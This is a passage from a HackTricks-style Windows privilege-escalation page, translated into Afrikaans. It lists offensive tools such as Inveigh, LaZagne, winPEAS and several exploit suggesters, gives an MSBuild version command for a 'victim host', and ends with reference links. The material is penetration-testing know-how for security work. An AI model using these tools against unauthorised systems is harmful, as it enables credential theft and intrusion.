[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS spoofer en man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc vulnerabilities (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc vulnerabilities (moet met VisualStudio gecompileer word) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die host en soek na misconfigurations (meer 'n gather info tool as privesc) (moet gecompileer word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek credentials uit baie software (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kyk vir misconfiguration (executable precompiled in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kyk vir moontlike misconfigurations (exe uit python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep op grond van hierdie post (dit benodig nie accesschk om behoorlik te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die project compile met die korrekte version van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde version van .NET op die victim host te sien, kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
